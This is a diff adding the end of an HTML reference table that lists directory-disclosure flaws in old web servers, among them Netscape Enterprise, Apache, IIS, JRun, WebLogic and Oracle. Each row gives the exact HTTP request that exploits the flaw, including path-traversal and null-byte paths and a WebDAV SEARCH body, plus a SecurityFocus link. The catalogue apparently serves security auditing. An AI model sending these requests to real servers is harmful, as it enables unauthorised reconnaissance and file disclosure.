+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Netscape Enterprise Server %20 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /file%20 HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/273" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/273</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Netscape Enterprise Server /publisher </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /publisher HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/2416" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/2416</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Netscape Enterprise Server Win32 8.3 filename </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=doctext>Normal Request:</p>
+  <p class=doctext>GET /directory/ HTTP/1.0</p>
+  <p class=doctext>Exploitative Request:</p>
+  <p class=doctext>GET /direct~1/ HTTP/1.0</p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/584" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/584</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span class=docemphasis1><span style='font-size:10.5pt;
+  font-family:Arial;color:black'>Directory Disclosure</span></span><span
+  style='font-size:10.5pt;font-family:Arial;color:black'> <span
+  class=docemphasis1>Vulnerable Application</span> </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span class=docemphasis1><span style='font-size:10.5pt;
+  font-family:Arial;color:black'>HTTP Request</span></span><span
+  style='font-size:10.5pt;font-family:Arial;color:black'> </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span class=docemphasis1><span style='font-size:10.5pt;
+  font-family:Arial;color:black'>Vulnerability Information</span></span><span
+  style='font-size:10.5pt;font-family:Arial;color:black'> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Allaire JRun //WEB-INF/ </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET //WEB-INF/ HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/3662" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/3662</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Allaire JRun %3f </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /%3f.jsp HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/3592" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/3592</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Apache Web Server + Mac OS X .DS_Store </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=doctext>1. GET /.DS_Store HTTP/1.0</p>
+  <p class=doctext>2. GET /.<span class=docemphasis1>FBCIndex</span> HTTP/1.0</p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/3316" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/3316</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Apache Web Server Multiview </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=doctext>1. GET /?M=A HTTP/1.0</p>
+  <p class=doctext>2. GET /?S=D HTTP/1.0</p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/3009" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/3009</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Apache Web Server Long Slash </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET <span class=docemphasis1>&lt;1 to 4096 '/' characters&gt;</span>
+  HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/2503" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/2503</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Apache Web Server/cgi-bin/test-cgi </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=doctext>1. GET /<span class=docemphasis1>cgi</span>-bin/test-cgi?/*
+  HTTP/1.0</p>
+  <p class=doctext>2. GET /<span class=docemphasis1>cgi</span>-bin/test-cgi?*
+  HTTP/1.0</p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/2003" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/2003</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>BEA WebLogic /%00/ </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=doctext>1. GET /%00/ HTTP/1.0</p>
+  <p class=doctext>2. GET /%2e/ HTTP/1.0</p>
+  <p class=doctext>3. GET /%2f/ HTTP/1.0</p>
+  <p class=doctext>4. GET /%5c/ HTTP/1.0</p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/2513" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/2513</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Microsoft IIS 5.0 WebDAV </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=doctext>SEARCH / HTTP/1.1</p>
+  <p class=doctext>Host: <span class=docemphasis1>&lt;hostname or ip
+  address&gt;</span></p>
+  <p class=doctext>Content-Type: text/xml</p>
+  <p class=doctext>Content-Length: 133</p>
+  <p class=doctext>&lt;?xml version=&quot;1.0&quot;?&gt;</p>
+  <p class=doctext>&lt;g:searchrequest xmlns:g=&quot;DAV:&quot;&gt;</p>
+  <p class=doctext>&lt;g:sql&gt;</p>
+  <p class=doctext>Select &quot;DAV:displayname&quot; from scope()</p>
+  <p class=doctext>&lt;/g:sql&gt;</p>
+  <p class=doctext>&lt;/g:searchrequest&gt;</p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/1756" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/1756</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Microsoft IIS 3.0/4.0 BDIR.HTR </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span lang=EN-GB style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /scripts/iisadmin/bdir.htr??c:\HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/2280" target="_blank"><span
+  lang=EN-GB style='color:#003399'>http://www.securityfocus.com/bid/2280</span></a></span><span
+  style='font-size:10.5pt;font-family:Arial;color:black'> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Netscape Enterprise Server INDEX </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>INDEX / HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/2285" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/2285</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Netscape Enterprise Server /?wp-cs-dump </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=doctext><span lang=EN-GB>1. GET /?wp-cs-dump HTTP/1.0</span></p>
+  <p class=doctext><span lang=EN-GB>2. GET /?wp-ver-info HTTP/1.0</span></p>
+  <p class=doctext><span lang=EN-GB>3. GET /?wp-html-rend HTTP/1.0</span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/1063" target="_blank"><span
+  lang=EN-GB style='color:#003399'>http://www.securityfocus.com/bid/1063</span></a></span><span
+  style='font-size:10.5pt;font-family:Arial;color:black'> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span lang=EN-GB style='font-size:10.5pt;font-family:Arial;
+  color:black'>Oracle Internet Application Server /WebDB/admin_/ </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>GET /WebDB/admin_/ HTTP/1.0 </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/2171" target="_blank"><span
+  style='color:#003399'>http://www.securityfocus.com/bid/2171</span></a> </span></p>
+  </td>
+ </tr>
+ <tr>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'>Oracle 9i Application Server mod_plsql </span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=doctext><span lang=EN-GB>GET /pls/sample/admin_/help/..%255</span></p>
+  <p class=doctext><span lang=EN-GB>c<span class=docemphasis1>&lt;relative path
+  to file&gt;</span> HTTP/1.0</span></p>
+  </td>
+  <td valign=top style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal><span style='font-size:10.5pt;font-family:Arial;
+  color:black'><a href="http://www.securityfocus.com/bid/3727" target="_blank"><span
+  lang=EN-GB style='color:#003399'>http://www.securityfocus.com/bid/3727</span></a></span><span
+  style='font-size:10.5pt;font-family:Arial;color:black'> </span></p>
+  </td>
+ </tr>
+</table>
+
+<p class=MsoNormal><span lang=EN-GB>&nbsp;</span></p>
+
+</div>
+
+<!--504690132--><br></body>
+
+</html>
+
